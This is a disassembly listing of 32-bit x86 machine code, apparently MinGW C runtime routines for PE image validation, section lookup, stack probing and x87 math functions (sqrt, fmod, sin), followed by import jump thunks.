  4067a2:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4067a8:	a1 b4 93 40 00       	mov    0x4093b4,%eax
  4067ad:	85 c0                	test   %eax,%eax
  4067af:	74 05                	je     0x4067b6
  4067b1:	e8 0a fe ff ff       	call   0x4065c0
  4067b6:	a1 b4 93 40 00       	mov    0x4093b4,%eax
  4067bb:	83 f8 01             	cmp    $0x1,%eax
  4067be:	75 aa                	jne    0x40676a
  4067c0:	8b 1d b0 93 40 00    	mov    0x4093b0,%ebx
  4067c6:	85 db                	test   %ebx,%ebx
  4067c8:	74 17                	je     0x4067e1
  4067ca:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4067d0:	89 d8                	mov    %ebx,%eax
  4067d2:	8b 5b 08             	mov    0x8(%ebx),%ebx
  4067d5:	89 04 24             	mov    %eax,(%esp)
  4067d8:	e8 83 06 00 00       	call   0x406e60
  4067dd:	85 db                	test   %ebx,%ebx
  4067df:	75 ef                	jne    0x4067d0
  4067e1:	c7 05 b0 93 40 00 00 	movl   $0x0,0x4093b0
  4067e8:	00 00 00 
  4067eb:	c7 05 b4 93 40 00 00 	movl   $0x0,0x4093b4
  4067f2:	00 00 00 
  4067f5:	c7 04 24 b8 93 40 00 	movl   $0x4093b8,(%esp)
  4067fc:	ff 15 18 a2 40 00    	call   *0x40a218
  406802:	83 ec 04             	sub    $0x4,%esp
  406805:	e9 60 ff ff ff       	jmp    0x40676a
  40680a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  406810:	e8 5b f7 ff ff       	call   0x405f70
  406815:	83 c4 18             	add    $0x18,%esp
  406818:	b8 01 00 00 00       	mov    $0x1,%eax
  40681d:	5b                   	pop    %ebx
  40681e:	c3                   	ret
  40681f:	90                   	nop
  406820:	03 40 3c             	add    0x3c(%eax),%eax
  406823:	81 38 50 45 00 00    	cmpl   $0x4550,(%eax)
  406829:	75 15                	jne    0x406840
  40682b:	66 81 78 18 0b 01    	cmpw   $0x10b,0x18(%eax)
  406831:	0f 94 c0             	sete   %al
  406834:	0f b6 c0             	movzbl %al,%eax
  406837:	c3                   	ret
  406838:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40683f:	90                   	nop
  406840:	31 c0                	xor    %eax,%eax
  406842:	c3                   	ret
  406843:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40684a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  406850:	8b 44 24 04          	mov    0x4(%esp),%eax
  406854:	66 81 38 4d 5a       	cmpw   $0x5a4d,(%eax)
  406859:	75 05                	jne    0x406860
  40685b:	eb c3                	jmp    0x406820
  40685d:	8d 76 00             	lea    0x0(%esi),%esi
  406860:	31 c0                	xor    %eax,%eax
  406862:	c3                   	ret
  406863:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40686a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  406870:	56                   	push   %esi
  406871:	53                   	push   %ebx
  406872:	8b 54 24 0c          	mov    0xc(%esp),%edx
  406876:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  40687a:	03 52 3c             	add    0x3c(%edx),%edx
  40687d:	0f b7 42 14          	movzwl 0x14(%edx),%eax
  406881:	0f b7 72 06          	movzwl 0x6(%edx),%esi
  406885:	8d 44 02 18          	lea    0x18(%edx,%eax,1),%eax
  406889:	85 f6                	test   %esi,%esi
  40688b:	74 1b                	je     0x4068a8
  40688d:	31 c9                	xor    %ecx,%ecx
  40688f:	90                   	nop
  406890:	8b 50 0c             	mov    0xc(%eax),%edx
  406893:	39 da                	cmp    %ebx,%edx
  406895:	77 07                	ja     0x40689e
  406897:	03 50 08             	add    0x8(%eax),%edx
  40689a:	39 da                	cmp    %ebx,%edx
  40689c:	77 0c                	ja     0x4068aa
  40689e:	83 c1 01             	add    $0x1,%ecx
  4068a1:	83 c0 28             	add    $0x28,%eax
  4068a4:	39 f1                	cmp    %esi,%ecx
  4068a6:	75 e8                	jne    0x406890
  4068a8:	31 c0                	xor    %eax,%eax
  4068aa:	5b                   	pop    %ebx
  4068ab:	5e                   	pop    %esi
  4068ac:	c3                   	ret
  4068ad:	8d 76 00             	lea    0x0(%esi),%esi
  4068b0:	55                   	push   %ebp
  4068b1:	57                   	push   %edi
  4068b2:	56                   	push   %esi
  4068b3:	53                   	push   %ebx
  4068b4:	31 db                	xor    %ebx,%ebx
  4068b6:	83 ec 1c             	sub    $0x1c,%esp
  4068b9:	8b 7c 24 30          	mov    0x30(%esp),%edi
  4068bd:	89 3c 24             	mov    %edi,(%esp)
  4068c0:	e8 63 05 00 00       	call   0x406e28
  4068c5:	83 f8 08             	cmp    $0x8,%eax
  4068c8:	77 60                	ja     0x40692a
  4068ca:	66 81 3d 00 00 40 00 	cmpw   $0x5a4d,0x400000
  4068d1:	4d 5a 
  4068d3:	75 55                	jne    0x40692a
  4068d5:	b8 00 00 40 00       	mov    $0x400000,%eax
  4068da:	e8 41 ff ff ff       	call   0x406820
  4068df:	85 c0                	test   %eax,%eax
  4068e1:	74 47                	je     0x40692a
  4068e3:	a1 3c 00 40 00       	mov    0x40003c,%eax
  4068e8:	0f b7 90 14 00 40 00 	movzwl 0x400014(%eax),%edx
  4068ef:	0f b7 a8 06 00 40 00 	movzwl 0x400006(%eax),%ebp
  4068f6:	8d 9c 10 18 00 40 00 	lea    0x400018(%eax,%edx,1),%ebx
  4068fd:	85 ed                	test   %ebp,%ebp
  4068ff:	74 37                	je     0x406938
  406901:	31 f6                	xor    %esi,%esi
  406903:	eb 0d                	jmp    0x406912
  406905:	8d 76 00             	lea    0x0(%esi),%esi
  406908:	83 c6 01             	add    $0x1,%esi
  40690b:	83 c3 28             	add    $0x28,%ebx
  40690e:	39 ee                	cmp    %ebp,%esi
  406910:	74 26                	je     0x406938
  406912:	c7 44 24 08 08 00 00 	movl   $0x8,0x8(%esp)
  406919:	00 
  40691a:	89 7c 24 04          	mov    %edi,0x4(%esp)
  40691e:	89 1c 24             	mov    %ebx,(%esp)
  406921:	e8 fa 04 00 00       	call   0x406e20
  406926:	85 c0                	test   %eax,%eax
  406928:	75 de                	jne    0x406908
  40692a:	83 c4 1c             	add    $0x1c,%esp
  40692d:	89 d8                	mov    %ebx,%eax
  40692f:	5b                   	pop    %ebx
  406930:	5e                   	pop    %esi
  406931:	5f                   	pop    %edi
  406932:	5d                   	pop    %ebp
  406933:	c3                   	ret
  406934:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  406938:	83 c4 1c             	add    $0x1c,%esp
  40693b:	31 db                	xor    %ebx,%ebx
  40693d:	89 d8                	mov    %ebx,%eax
  40693f:	5b                   	pop    %ebx
  406940:	5e                   	pop    %esi
  406941:	5f                   	pop    %edi
  406942:	5d                   	pop    %ebp
  406943:	c3                   	ret
  406944:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40694b:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  40694f:	90                   	nop
  406950:	31 d2                	xor    %edx,%edx
  406952:	66 81 3d 00 00 40 00 	cmpw   $0x5a4d,0x400000
  406959:	4d 5a 
  40695b:	75 63                	jne    0x4069c0
  40695d:	56                   	push   %esi
  40695e:	b8 00 00 40 00       	mov    $0x400000,%eax
  406963:	53                   	push   %ebx
  406964:	e8 b7 fe ff ff       	call   0x406820
  406969:	85 c0                	test   %eax,%eax
  40696b:	74 4d                	je     0x4069ba
  40696d:	a1 3c 00 40 00       	mov    0x40003c,%eax
  406972:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  406976:	0f b7 90 14 00 40 00 	movzwl 0x400014(%eax),%edx
  40697d:	0f b7 b0 06 00 40 00 	movzwl 0x400006(%eax),%esi
  406984:	81 eb 00 00 40 00    	sub    $0x400000,%ebx
  40698a:	8d 94 10 18 00 40 00 	lea    0x400018(%eax,%edx,1),%edx
  406991:	85 f6                	test   %esi,%esi
  406993:	74 23                	je     0x4069b8
  406995:	31 c9                	xor    %ecx,%ecx
  406997:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40699e:	66 90                	xchg   %ax,%ax
  4069a0:	8b 42 0c             	mov    0xc(%edx),%eax
  4069a3:	39 c3                	cmp    %eax,%ebx
  4069a5:	72 07                	jb     0x4069ae
  4069a7:	03 42 08             	add    0x8(%edx),%eax
  4069aa:	39 c3                	cmp    %eax,%ebx
  4069ac:	72 0c                	jb     0x4069ba
  4069ae:	83 c1 01             	add    $0x1,%ecx
  4069b1:	83 c2 28             	add    $0x28,%edx
  4069b4:	39 f1                	cmp    %esi,%ecx
  4069b6:	75 e8                	jne    0x4069a0
  4069b8:	31 d2                	xor    %edx,%edx
  4069ba:	89 d0                	mov    %edx,%eax
  4069bc:	5b                   	pop    %ebx
  4069bd:	5e                   	pop    %esi
  4069be:	c3                   	ret
  4069bf:	90                   	nop
  4069c0:	89 d0                	mov    %edx,%eax
  4069c2:	c3                   	ret
  4069c3:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4069ca:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4069d0:	31 c0                	xor    %eax,%eax
  4069d2:	66 81 3d 00 00 40 00 	cmpw   $0x5a4d,0x400000
  4069d9:	4d 5a 
  4069db:	75 1a                	jne    0x4069f7
  4069dd:	b8 00 00 40 00       	mov    $0x400000,%eax
  4069e2:	e8 39 fe ff ff       	call   0x406820
  4069e7:	85 c0                	test   %eax,%eax
  4069e9:	74 0c                	je     0x4069f7
  4069eb:	a1 3c 00 40 00       	mov    0x40003c,%eax
  4069f0:	0f b7 80 06 00 40 00 	movzwl 0x400006(%eax),%eax
  4069f7:	c3                   	ret
  4069f8:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4069ff:	90                   	nop
  406a00:	31 d2                	xor    %edx,%edx
  406a02:	53                   	push   %ebx
  406a03:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  406a07:	66 81 3d 00 00 40 00 	cmpw   $0x5a4d,0x400000
  406a0e:	4d 5a 
  406a10:	75 47                	jne    0x406a59
  406a12:	b8 00 00 40 00       	mov    $0x400000,%eax
  406a17:	e8 04 fe ff ff       	call   0x406820
  406a1c:	85 c0                	test   %eax,%eax
  406a1e:	74 39                	je     0x406a59
  406a20:	a1 3c 00 40 00       	mov    0x40003c,%eax
  406a25:	0f b7 90 14 00 40 00 	movzwl 0x400014(%eax),%edx
  406a2c:	0f b7 98 06 00 40 00 	movzwl 0x400006(%eax),%ebx
  406a33:	8d 94 10 18 00 40 00 	lea    0x400018(%eax,%edx,1),%edx
  406a3a:	85 db                	test   %ebx,%ebx
  406a3c:	74 19                	je     0x406a57
  406a3e:	31 c0                	xor    %eax,%eax
  406a40:	f6 42 27 20          	testb  $0x20,0x27(%edx)
  406a44:	74 07                	je     0x406a4d
  406a46:	85 c9                	test   %ecx,%ecx
  406a48:	74 0f                	je     0x406a59
  406a4a:	83 e9 01             	sub    $0x1,%ecx
  406a4d:	83 c0 01             	add    $0x1,%eax
  406a50:	83 c2 28             	add    $0x28,%edx
  406a53:	39 d8                	cmp    %ebx,%eax
  406a55:	75 e9                	jne    0x406a40
  406a57:	31 d2                	xor    %edx,%edx
  406a59:	89 d0                	mov    %edx,%eax
  406a5b:	5b                   	pop    %ebx
  406a5c:	c3                   	ret
  406a5d:	8d 76 00             	lea    0x0(%esi),%esi
  406a60:	31 d2                	xor    %edx,%edx
  406a62:	66 81 3d 00 00 40 00 	cmpw   $0x5a4d,0x400000
  406a69:	4d 5a 
  406a6b:	75 14                	jne    0x406a81
  406a6d:	b8 00 00 40 00       	mov    $0x400000,%eax
  406a72:	e8 a9 fd ff ff       	call   0x406820
  406a77:	85 c0                	test   %eax,%eax
  406a79:	b8 00 00 40 00       	mov    $0x400000,%eax
  406a7e:	0f 45 d0             	cmovne %eax,%edx
  406a81:	89 d0                	mov    %edx,%eax
  406a83:	c3                   	ret
  406a84:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  406a8b:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  406a8f:	90                   	nop
  406a90:	31 c0                	xor    %eax,%eax
  406a92:	66 81 3d 00 00 40 00 	cmpw   $0x5a4d,0x400000
  406a99:	4d 5a 
  406a9b:	75 63                	jne    0x406b00
  406a9d:	56                   	push   %esi
  406a9e:	b8 00 00 40 00       	mov    $0x400000,%eax
  406aa3:	53                   	push   %ebx
  406aa4:	e8 77 fd ff ff       	call   0x406820
  406aa9:	85 c0                	test   %eax,%eax
  406aab:	74 4d                	je     0x406afa
  406aad:	8b 15 3c 00 40 00    	mov    0x40003c,%edx
  406ab3:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  406ab7:	0f b7 82 14 00 40 00 	movzwl 0x400014(%edx),%eax
  406abe:	0f b7 b2 06 00 40 00 	movzwl 0x400006(%edx),%esi
  406ac5:	81 eb 00 00 40 00    	sub    $0x400000,%ebx
  406acb:	8d 84 02 18 00 40 00 	lea    0x400018(%edx,%eax,1),%eax
  406ad2:	85 f6                	test   %esi,%esi
  406ad4:	74 22                	je     0x406af8
  406ad6:	31 c9                	xor    %ecx,%ecx
  406ad8:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  406adf:	90                   	nop
  406ae0:	8b 50 0c             	mov    0xc(%eax),%edx
  406ae3:	39 d3                	cmp    %edx,%ebx
  406ae5:	72 07                	jb     0x406aee
  406ae7:	03 50 08             	add    0x8(%eax),%edx
  406aea:	39 d3                	cmp    %edx,%ebx
  406aec:	72 1a                	jb     0x406b08
  406aee:	83 c1 01             	add    $0x1,%ecx
  406af1:	83 c0 28             	add    $0x28,%eax
  406af4:	39 f1                	cmp    %esi,%ecx
  406af6:	75 e8                	jne    0x406ae0
  406af8:	31 c0                	xor    %eax,%eax
  406afa:	5b                   	pop    %ebx
  406afb:	5e                   	pop    %esi
  406afc:	c3                   	ret
  406afd:	8d 76 00             	lea    0x0(%esi),%esi
  406b00:	c3                   	ret
  406b01:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  406b08:	8b 40 24             	mov    0x24(%eax),%eax
  406b0b:	5b                   	pop    %ebx
  406b0c:	5e                   	pop    %esi
  406b0d:	f7 d0                	not    %eax
  406b0f:	c1 e8 1f             	shr    $0x1f,%eax
  406b12:	c3                   	ret
  406b13:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  406b1a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  406b20:	31 c9                	xor    %ecx,%ecx
  406b22:	57                   	push   %edi
  406b23:	66 81 3d 00 00 40 00 	cmpw   $0x5a4d,0x400000
  406b2a:	4d 5a 
  406b2c:	56                   	push   %esi
  406b2d:	53                   	push   %ebx
  406b2e:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  406b32:	75 56                	jne    0x406b8a
  406b34:	b8 00 00 40 00       	mov    $0x400000,%eax
  406b39:	e8 e2 fc ff ff       	call   0x406820
  406b3e:	85 c0                	test   %eax,%eax
  406b40:	74 48                	je     0x406b8a
  406b42:	a1 3c 00 40 00       	mov    0x40003c,%eax
  406b47:	8d b0 00 00 40 00    	lea    0x400000(%eax),%esi
  406b4d:	8b 80 80 00 40 00    	mov    0x400080(%eax),%eax
  406b53:	85 c0                	test   %eax,%eax
  406b55:	74 33                	je     0x406b8a
  406b57:	0f b7 56 14          	movzwl 0x14(%esi),%edx
  406b5b:	0f b7 7e 06          	movzwl 0x6(%esi),%edi
  406b5f:	8d 54 16 18          	lea    0x18(%esi,%edx,1),%edx
  406b63:	85 ff                	test   %edi,%edi
  406b65:	74 23                	je     0x406b8a
  406b67:	31 f6                	xor    %esi,%esi
  406b69:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  406b70:	8b 4a 0c             	mov    0xc(%edx),%ecx
  406b73:	39 c8                	cmp    %ecx,%eax
  406b75:	72 07                	jb     0x406b7e
  406b77:	03 4a 08             	add    0x8(%edx),%ecx
  406b7a:	39 c8                	cmp    %ecx,%eax
  406b7c:	72 12                	jb     0x406b90
  406b7e:	83 c6 01             	add    $0x1,%esi
  406b81:	83 c2 28             	add    $0x28,%edx
  406b84:	39 fe                	cmp    %edi,%esi
  406b86:	75 e8                	jne    0x406b70
  406b88:	31 c9                	xor    %ecx,%ecx
  406b8a:	5b                   	pop    %ebx
  406b8b:	89 c8                	mov    %ecx,%eax
  406b8d:	5e                   	pop    %esi
  406b8e:	5f                   	pop    %edi
  406b8f:	c3                   	ret
  406b90:	05 00 00 40 00       	add    $0x400000,%eax
  406b95:	eb 0f                	jmp    0x406ba6
  406b97:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  406b9e:	66 90                	xchg   %ax,%ax
  406ba0:	83 eb 01             	sub    $0x1,%ebx
  406ba3:	83 c0 14             	add    $0x14,%eax
  406ba6:	8b 48 04             	mov    0x4(%eax),%ecx
  406ba9:	85 c9                	test   %ecx,%ecx
  406bab:	75 07                	jne    0x406bb4
  406bad:	8b 50 0c             	mov    0xc(%eax),%edx
  406bb0:	85 d2                	test   %edx,%edx
  406bb2:	74 d4                	je     0x406b88
  406bb4:	85 db                	test   %ebx,%ebx
  406bb6:	7f e8                	jg     0x406ba0
  406bb8:	8b 48 0c             	mov    0xc(%eax),%ecx
  406bbb:	5b                   	pop    %ebx
  406bbc:	5e                   	pop    %esi
  406bbd:	5f                   	pop    %edi
  406bbe:	81 c1 00 00 40 00    	add    $0x400000,%ecx
  406bc4:	89 c8                	mov    %ecx,%eax
  406bc6:	c3                   	ret
  406bc7:	90                   	nop
  406bc8:	90                   	nop
  406bc9:	90                   	nop
  406bca:	90                   	nop
  406bcb:	90                   	nop
  406bcc:	90                   	nop
  406bcd:	90                   	nop
  406bce:	90                   	nop
  406bcf:	90                   	nop
  406bd0:	51                   	push   %ecx
  406bd1:	50                   	push   %eax
  406bd2:	3d 00 10 00 00       	cmp    $0x1000,%eax
  406bd7:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  406bdb:	72 15                	jb     0x406bf2
  406bdd:	81 e9 00 10 00 00    	sub    $0x1000,%ecx
  406be3:	83 09 00             	orl    $0x0,(%ecx)
  406be6:	2d 00 10 00 00       	sub    $0x1000,%eax
  406beb:	3d 00 10 00 00       	cmp    $0x1000,%eax
  406bf0:	77 eb                	ja     0x406bdd
  406bf2:	29 c1                	sub    %eax,%ecx
  406bf4:	83 09 00             	orl    $0x0,(%ecx)
  406bf7:	58                   	pop    %eax
  406bf8:	59                   	pop    %ecx
  406bf9:	c3                   	ret
  406bfa:	90                   	nop
  406bfb:	90                   	nop
  406bfc:	66 90                	xchg   %ax,%ax
  406bfe:	66 90                	xchg   %ax,%ax
  406c00:	83 ec 3c             	sub    $0x3c,%esp
  406c03:	dd 44 24 40          	fldl   0x40(%esp)
  406c07:	d9 e5                	fxam
  406c09:	9b df e0             	fstsw  %ax
  406c0c:	66 25 00 45          	and    $0x4500,%ax
  406c10:	66 3d 00 01          	cmp    $0x100,%ax
  406c14:	0f 84 9e 00 00 00    	je     0x406cb8
  406c1a:	89 c2                	mov    %eax,%edx
  406c1c:	d9 e5                	fxam
  406c1e:	9b df e0             	fstsw  %ax
  406c21:	f6 c4 02             	test   $0x2,%ah
  406c24:	75 2a                	jne    0x406c50
  406c26:	66 81 fa 00 40       	cmp    $0x4000,%dx
  406c2b:	0f 84 c7 00 00 00    	je     0x406cf8
  406c31:	66 81 fa 00 05       	cmp    $0x500,%dx
  406c36:	0f 84 c4 00 00 00    	je     0x406d00
  406c3c:	d9 e8                	fld1
  406c3e:	d9 c9                	fxch   %st(1)
  406c40:	db e9                	fucomi %st(1),%st
  406c42:	dd d9                	fstp   %st(1)
  406c44:	7b 6a                	jnp    0x406cb0
  406c46:	d9 fa                	fsqrt
  406c48:	83 c4 3c             	add    $0x3c,%esp
  406c4b:	c3                   	ret
  406c4c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  406c50:	66 81 fa 00 40       	cmp    $0x4000,%dx
  406c55:	74 49                	je     0x406ca0
  406c57:	dd 5c 24 28          	fstpl  0x28(%esp)
  406c5b:	e8 38 02 00 00       	call   0x406e98
  406c60:	d9 05 c4 83 40 00    	flds   0x4083c4
  406c66:	c7 00 21 00 00 00    	movl   $0x21,(%eax)
  406c6c:	c7 44 24 04 b8 83 40 	movl   $0x4083b8,0x4(%esp)
  406c73:	00 
  406c74:	dd 5c 24 18          	fstpl  0x18(%esp)
  406c78:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
  406c7f:	d9 ee                	fldz
  406c81:	dd 5c 24 10          	fstpl  0x10(%esp)
  406c85:	dd 44 24 28          	fldl   0x28(%esp)
  406c89:	dd 5c 24 08          	fstpl  0x8(%esp)
  406c8d:	e8 0e f7 ff ff       	call   0x4063a0
  406c92:	d9 05 c4 83 40 00    	flds   0x4083c4
  406c98:	83 c4 3c             	add    $0x3c,%esp
  406c9b:	c3                   	ret
  406c9c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  406ca0:	dd d8                	fstp   %st(0)
  406ca2:	d9 ee                	fldz
  406ca4:	83 c4 3c             	add    $0x3c,%esp
  406ca7:	d9 e0                	fchs
  406ca9:	c3                   	ret
  406caa:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  406cb0:	74 e6                	je     0x406c98
  406cb2:	eb 92                	jmp    0x406c46
  406cb4:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  406cb8:	dd 5c 24 28          	fstpl  0x28(%esp)
  406cbc:	e8 d7 01 00 00       	call   0x406e98
  406cc1:	dd 44 24 28          	fldl   0x28(%esp)
  406cc5:	c7 00 21 00 00 00    	movl   $0x21,(%eax)
  406ccb:	c7 44 24 04 b8 83 40 	movl   $0x4083b8,0x4(%esp)
  406cd2:	00 
  406cd3:	dd 54 24 18          	fstl   0x18(%esp)
  406cd7:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
  406cde:	d9 ee                	fldz
  406ce0:	dd 5c 24 10          	fstpl  0x10(%esp)
  406ce4:	dd 5c 24 08          	fstpl  0x8(%esp)
  406ce8:	e8 b3 f6 ff ff       	call   0x4063a0
  406ced:	dd 44 24 28          	fldl   0x28(%esp)
  406cf1:	83 c4 3c             	add    $0x3c,%esp
  406cf4:	c3                   	ret
  406cf5:	8d 76 00             	lea    0x0(%esi),%esi
  406cf8:	dd d8                	fstp   %st(0)
  406cfa:	d9 ee                	fldz
  406cfc:	eb 9a                	jmp    0x406c98
  406cfe:	66 90                	xchg   %ax,%ax
  406d00:	dd d8                	fstp   %st(0)
  406d02:	d9 05 c0 83 40 00    	flds   0x4083c0
  406d08:	eb 8e                	jmp    0x406c98
  406d0a:	90                   	nop
  406d0b:	90                   	nop
  406d0c:	90                   	nop
  406d0d:	90                   	nop
  406d0e:	90                   	nop
  406d0f:	90                   	nop
  406d10:	dd 44 24 0c          	fldl   0xc(%esp)
  406d14:	dd 44 24 04          	fldl   0x4(%esp)
  406d18:	d9 f8                	fprem
  406d1a:	9b df e0             	fstsw  %ax
  406d1d:	9e                   	sahf
  406d1e:	7a f8                	jp     0x406d18
  406d20:	dd d9                	fstp   %st(1)
  406d22:	c3                   	ret
  406d23:	90                   	nop
  406d24:	90                   	nop
  406d25:	90                   	nop
  406d26:	90                   	nop
  406d27:	90                   	nop
  406d28:	90                   	nop
  406d29:	90                   	nop
  406d2a:	90                   	nop
  406d2b:	90                   	nop
  406d2c:	90                   	nop
  406d2d:	90                   	nop
  406d2e:	90                   	nop
  406d2f:	90                   	nop
  406d30:	83 ec 3c             	sub    $0x3c,%esp
  406d33:	dd 44 24 40          	fldl   0x40(%esp)
  406d37:	d9 e5                	fxam
  406d39:	9b df e0             	fstsw  %ax
  406d3c:	66 25 00 45          	and    $0x4500,%ax
  406d40:	66 3d 00 01          	cmp    $0x100,%ax
  406d44:	74 62                	je     0x406da8
  406d46:	66 3d 00 05          	cmp    $0x500,%ax
  406d4a:	74 14                	je     0x406d60
  406d4c:	db 3c 24             	fstpt  (%esp)
  406d4f:	e8 9c 00 00 00       	call   0x406df0
  406d54:	dd 5c 24 28          	fstpl  0x28(%esp)
  406d58:	dd 44 24 28          	fldl   0x28(%esp)
  406d5c:	83 c4 3c             	add    $0x3c,%esp
  406d5f:	c3                   	ret
  406d60:	dd 5c 24 28          	fstpl  0x28(%esp)
  406d64:	e8 2f 01 00 00       	call   0x406e98
  406d69:	d9 05 cc 83 40 00    	flds   0x4083cc
  406d6f:	c7 00 21 00 00 00    	movl   $0x21,(%eax)
  406d75:	c7 44 24 04 c8 83 40 	movl   $0x4083c8,0x4(%esp)
  406d7c:	00 
  406d7d:	dd 5c 24 18          	fstpl  0x18(%esp)
  406d81:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
  406d88:	d9 ee                	fldz
  406d8a:	dd 5c 24 10          	fstpl  0x10(%esp)
  406d8e:	dd 44 24 28          	fldl   0x28(%esp)
  406d92:	dd 5c 24 08          	fstpl  0x8(%esp)
  406d96:	e8 05 f6 ff ff       	call   0x4063a0
  406d9b:	d9 05 cc 83 40 00    	flds   0x4083cc
  406da1:	83 c4 3c             	add    $0x3c,%esp
  406da4:	c3                   	ret
  406da5:	8d 76 00             	lea    0x0(%esi),%esi
  406da8:	dd 5c 24 28          	fstpl  0x28(%esp)
  406dac:	e8 e7 00 00 00       	call   0x406e98
  406db1:	dd 44 24 28          	fldl   0x28(%esp)
  406db5:	c7 00 21 00 00 00    	movl   $0x21,(%eax)
  406dbb:	c7 44 24 04 c8 83 40 	movl   $0x4083c8,0x4(%esp)
  406dc2:	00 
  406dc3:	dd 54 24 18          	fstl   0x18(%esp)
  406dc7:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
  406dce:	d9 ee                	fldz
  406dd0:	dd 5c 24 10          	fstpl  0x10(%esp)
  406dd4:	dd 5c 24 08          	fstpl  0x8(%esp)
  406dd8:	e8 c3 f5 ff ff       	call   0x4063a0
  406ddd:	dd 44 24 28          	fldl   0x28(%esp)
  406de1:	83 c4 3c             	add    $0x3c,%esp
  406de4:	c3                   	ret
  406de5:	90                   	nop
  406de6:	90                   	nop
  406de7:	90                   	nop
  406de8:	90                   	nop
  406de9:	90                   	nop
  406dea:	90                   	nop
  406deb:	90                   	nop
  406dec:	90                   	nop
  406ded:	90                   	nop
  406dee:	90                   	nop
  406def:	90                   	nop
  406df0:	db 6c 24 04          	fldt   0x4(%esp)
  406df4:	d9 fe                	fsin
  406df6:	df e0                	fnstsw %ax
  406df8:	a9 00 04 00 00       	test   $0x400,%eax
  406dfd:	75 01                	jne    0x406e00
  406dff:	c3                   	ret
  406e00:	d9 eb                	fldpi
  406e02:	d8 c0                	fadd   %st(0),%st
  406e04:	d9 c9                	fxch   %st(1)
  406e06:	d9 f5                	fprem1
  406e08:	df e0                	fnstsw %ax
  406e0a:	a9 00 04 00 00       	test   $0x400,%eax
  406e0f:	75 f5                	jne    0x406e06
  406e11:	dd d9                	fstp   %st(1)
  406e13:	d9 fe                	fsin
  406e15:	c3                   	ret
  406e16:	90                   	nop
  406e17:	90                   	nop
  406e18:	ff 25 e0 a2 40 00    	jmp    *0x40a2e0
  406e1e:	90                   	nop
  406e1f:	90                   	nop
  406e20:	ff 25 dc a2 40 00    	jmp    *0x40a2dc
  406e26:	90                   	nop
  406e27:	90                   	nop
  406e28:	ff 25 d8 a2 40 00    	jmp    *0x40a2d8
  406e2e:	90                   	nop
  406e2f:	90                   	nop
  406e30:	ff 25 d4 a2 40 00    	jmp    *0x40a2d4
  406e36:	90                   	nop
  406e37:	90                   	nop
  406e38:	ff 25 d0 a2 40 00    	jmp    *0x40a2d0
  406e3e:	90                   	nop
  406e3f:	90                   	nop
  406e40:	ff 25 cc a2 40 00    	jmp    *0x40a2cc
  406e46:	90                   	nop
  406e47:	90                   	nop
  406e48:	ff 25 c8 a2 40 00    	jmp    *0x40a2c8
  406e4e:	90                   	nop
  406e4f:	90                   	nop
  406e50:	ff 25 c4 a2 40 00    	jmp    *0x40a2c4
  406e56:	90                   	nop
  406e57:	90                   	nop
  406e58:	ff 25 c0 a2 40 00    	jmp    *0x40a2c0
  406e5e:	90                   	nop
  406e5f:	90                   	nop
  406e60:	ff 25 bc a2 40 00    	jmp    *0x40a2bc
  406e66:	90                   	nop
  406e67:	90                   	nop
  406e68:	ff 25 b8 a2 40 00    	jmp    *0x40a2b8
  406e6e:	90                   	nop
  406e6f:	90                   	nop
  406e70:	ff 25 b4 a2 40 00    	jmp    *0x40a2b4
  406e76:	90                   	nop
  406e77:	90                   	nop
  406e78:	ff 25 b0 a2 40 00    	jmp    *0x40a2b0
  406e7e:	90                   	nop
  406e7f:	90                   	nop
  406e80:	ff 25 ac a2 40 00    	jmp    *0x40a2ac
  406e86:	90                   	nop
  406e87:	90                   	nop
  406e88:	ff 25 a8 a2 40 00    	jmp    *0x40a2a8
  406e8e:	90                   	nop
  406e8f:	90                   	nop
  406e90:	ff 25 a0 a2 40 00    	jmp    *0x40a2a0
  406e96:	90                   	nop
  406e97:	90                   	nop
  406e98:	ff 25 9c a2 40 00    	jmp    *0x40a29c
  406e9e:	90                   	nop
  406e9f:	90                   	nop
  406ea0:	ff 25 98 a2 40 00    	jmp    *0x40a298
  406ea6:	90                   	nop
  406ea7:	90                   	nop
  406ea8:	ff 25 94 a2 40 00    	jmp    *0x40a294
  406eae:	90                   	nop
  406eaf:	90                   	nop
  406eb0:	ff 25 90 a2 40 00    	jmp    *0x40a290
  406eb6:	90                   	nop
  406eb7:	90                   	nop
